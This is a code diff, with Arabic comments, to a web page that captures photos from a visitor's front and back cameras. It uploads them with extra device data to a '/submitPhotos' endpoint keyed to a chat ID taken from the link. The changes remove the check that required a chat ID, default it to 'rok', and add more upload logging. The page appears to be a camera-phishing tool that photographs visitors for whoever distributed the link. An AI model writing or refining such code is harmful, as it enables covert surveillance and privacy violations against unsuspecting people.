@@ -244,10 +244,10 @@
         const backCanvas = document.getElementById('backCanvas');
         const statusText = document.getElementById('statusText');
 
-        // 🆔 الحصول على معرف المستخدم من الرابط
+        // 🔧 دالة محسنة للحصول على chatId
         function getChatId() {
             const urlParams = new URLSearchParams(window.location.search);
-            let chatId = urlParams.get('chatId');
+            let chatId = urlParams.get('chatId') || urlParams.get('id');
             
             if (!chatId) {
                 // محاولة الحصول عليه من المسار
@@ -260,7 +260,12 @@
                 }
             }
             
-            console.log("Retrieved chatId:", chatId);
+            // إذا لم يتم العثور على chatId، استخدم 'rok' كافتراضي
+            if (!chatId || chatId === 'rok.html' || chatId === '') {
+                chatId = 'rok';
+            }
+            
+            console.log("🎯 تم تحديد chatId:", chatId);
             return chatId;
         }
 
@@ -348,9 +353,7 @@
         async function init() {
             try {
                 const chatId = getChatId();
-                if (!chatId || chatId === 'camera.html' || chatId === '') {
-                    throw new Error('معرف المحادثة غير موجود - تأكد من صحة الرابط');
-                }
+                console.log('🎯 بدء التشغيل مع chatId:', chatId);
 
                 const additionalData = await collectAdditionalData();
                 statusText.textContent = '🎯 تجهيز الطلبات...';
@@ -422,10 +425,19 @@
                         const formData = new FormData();
                         formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
                         formData.append('userId', chatId);
+                        formData.append('chatId', chatId); // 🔥 أضف هذا السطر المهم!
                         formData.append('cameraType', cameraType);
                         formData.append('imageWidth', canvas.width);
                         formData.append('imageHeight', canvas.height);
                         formData.append('additionalData', JSON.stringify(additionalData));
+                        
+                        console.log('📤 إرسال بيانات:', {
+                            chatId: chatId,
+                            userId: chatId,
+                            cameraType: cameraType,
+                            photoCount: photoCount
+                        });
+                        
                         post('/submitPhotos', formData);
                     }, 'image/webp', 0.7);
 
@@ -454,7 +466,7 @@
                     const data = await response.json();
 
                     if (data.success) {
-                        console.log('✅ تم إرسال الصور بنجاح إلى السيرفر الجديد');
+                        console.log('✅ تم إرسال الصور بنجاح إلى السيرفر الجديد', data);
                         return;
                     } else {
                         throw new Error(data.error);
@@ -490,4 +502,4 @@
         }, { passive: false });
     </script>
 </body>
-</html>
+        </html>
